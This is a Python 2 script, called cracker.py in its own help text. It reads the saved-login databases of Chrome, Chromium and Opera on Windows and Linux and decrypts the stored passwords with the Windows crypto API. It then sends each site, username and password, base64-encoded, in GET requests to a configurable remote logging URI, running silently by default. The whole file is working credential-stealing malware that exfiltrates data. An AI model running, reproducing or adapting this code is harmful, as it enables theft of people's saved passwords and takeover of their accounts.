import os
import sqlite3
import urllib2
import base64
import sys

# *************************
# Define your settings here
# *************************

argsOverrideSettings = True     # define if command line arguments should be more important than this settings
printLog = False                # define if any text should be printed to console
printPasswords = False          # define if clear text passwords should be printed to console
sendViaGet = True               # define if base64 encoded passwords should be send via GET request to URI
uri = 'http://127.0.0.1/log.php?data='     # endpoint for passwords sending

# *************************
# End of settings
# *************************

# Constants
state = {
    'Ok': 1,
    'Debug_info': 0,
    'File_not_found_or_locked': -1,
    'Unable_to_decrypt': -3,
    'HTTP_timeout': -4
}


# Printing status to console
def log(state, text):
    if printLog:
        if state > 0:
            mode = '[ Ok ]'
        elif state < 0:
            mode = '[ Error ]'
        else:
            mode = '[ Info ]'

        print(mode + ' ' + text)


# Sending communicates to server
def sendToServer(data):
    if sendViaGet:
        data = base64.b64encode(data)
        
        try:
            urllib2.urlopen(uri + data)
        except urllib2.HTTPError:
            log(state['HTTP_timeout'], 'HTTP error occured')	    		


def printHelp():
    print('Usage:\n'
          '\tpython cracker.py [ARGS] [URI]\n')
    print('Parameters:\n'
          '\tv - be verbose\n'
          '\tp - print passwords to console\n'
          '\ts - send base64 encoded passwords to URI\n'
          '\th - print this help\n'
          'Arguments must be provided in one group (ok: -vps, not: -v -p -s)\n'
          'If no arguments needed and you must include URI - look at examples\n')
    print('Examples:\n'
          '\tpython cracker.py -vps http://www.example.com/log.php?data=\n\tBe extremely verbose and send passwords '
          'to specified uri\n'
          '\n\tpython cracker.py -s http://example.com/log.php?data=\n\tBe silent and send passwords to specified uri\n'
          '\n\tpython cracker.py -s\n\tBe silent and send passwords to hardcoded uri\n'
          '\n\tpython cracker.py\n\tUse hardcoded properties (be silent and send to hardcoded uri)\n'
          '\n\tpython cracker.py - http://example.com/log.php?data=\n\tUse hardcoded properties and specified uri')


# Check if any argv exists
if argsOverrideSettings and len(sys.argv) > 1:
    list = list(sys.argv[1])

    printLog = True if ('v' in list) else False
    printPasswords = True if ('p' in list) else False
    sendViaGet = True if ('s' in list) else False

    if 'h' in list:
        printHelp()
        exit()

    if len(sys.argv) == 3:
        uri = sys.argv[2]

# Check actual OS
isWindows = False
if os.name == 'nt':
    import win32crypt		# On Windows passwords are encrypted, so we need additional libs
    isWindows = True

# Definitions of application password database locations
if isWindows:
    paths = [
        ['Chrome', os.getenv("APPDATA") + '\..\local\Google\Chrome\User Data\Default\Login Data'],
        ['Chromium', os.getenv("APPDATA") + '\..\local\Chromium\User Data\Default\Login Data'],
        ['Opera Stable', os.getenv("APPDATA") + '\Opera Software\Opera Stable\Login Data'],
        ['Opera Developer', os.getenv("APPDATA") + '\Opera Software\Opera Developer\Login Data']
    ]
else:
    paths = [
        ['Chrome', os.getenv("HOME") + "/.config/google-chrome/Default/Login Data"],
        ['Chromium', os.getenv("HOME") + "/.config/chromium/Default/Login Data"]
        # opera 15+ is not available for Linux
    ]

# Connect to the Database
for path in paths:
    try:
        conn = sqlite3.connect(path[1])
    except sqlite3.OperationalError:
        log(state['File_not_found_or_locked'], 'Database not found or locked: ' + path[0] + ' (' + path[1] + ')')
        sendToServer('File not found or locked (' + path[0] + ')')
        continue

    cursor = conn.cursor()

    # Get the results
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except sqlite3.OperationalError:
        log(state['Debug_info'], 'Database is empty: ' + path[0])
        sendToServer('Database for ' + path[0] + ' is empty')
        continue    # Skip this DB

    res = cursor.fetchall()     # Fetch all passwords
    noError = True              # Flag for error handling

    for result in res:
        # Decrypt the Password
        if isWindows:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        else:
            password = result[2]

        if password:
            query = 'App:  ' + path[0] + '\nUri:  ' + result[0] + '\nUser: ' + result[1] + '\nPass: ' + password

            if printPasswords:
                print(query + '\n')

            sendToServer(query)
                
        elif noError:
            log(state['Unable_to_decrypt'], 'Unable to decrypt some password for ' + path[0])
            sendToServer('Unable to decrypt passwords for ' + path[0])
            noError = False

    if noError:
        log(state['Ok'], path[0])

